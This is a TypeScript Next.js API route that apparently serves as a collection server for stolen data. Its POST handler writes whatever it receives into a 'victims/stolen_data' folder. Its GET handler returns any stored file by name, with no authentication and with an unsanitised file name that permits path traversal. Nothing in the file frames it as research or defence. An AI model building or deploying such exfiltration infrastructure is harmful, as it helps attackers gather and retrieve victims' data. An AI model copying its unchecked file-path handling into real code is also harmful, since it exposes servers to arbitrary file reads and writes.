import { createFileDriveHandler } from '@/features/createFileHandler'
import type { NextApiRequest, NextApiResponse } from 'next'

export type ResponseData = {
  status:'OK'|'FAIL',
  error?:string
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<ResponseData | string>
) {
    if(req.method?.toLowerCase() == 'post'){
        const data = (req.body || Object.entries(req.query).length && JSON.stringify( req.query, null, 2 )) ?? ''
        if(!data) return res.status(200).json({ status:'FAIL', error:'no data provided'})

        const fileName = data.fileName ?? `${new Date().toISOString()}.json`
        const { createAndWrite } = await createFileDriveHandler({pathToFile:`public/victims/stolen_data/${fileName}`})

        if(!createAndWrite) return res.status(400).json({ status:'FAIL' ,error: `Cannot write data` })

        await createAndWrite(data)
        res.status(200).json({ status:'OK'})
    }

    if(req.method?.toLowerCase() == 'get'){
        const fileName = req.query?.file
        if(!fileName) return res.status(400).json({ status:'FAIL' ,error: `Bad argument 'fileName'` })
        const {readFile} = await createFileDriveHandler({pathToFile:`public/victims/stolen_data/${fileName}`})

        if(!readFile) return res.status(400).json({ status:'FAIL' ,error: `Cannot read data` })

        const data = await readFile()
        res.status(200).send(data)
    }
}
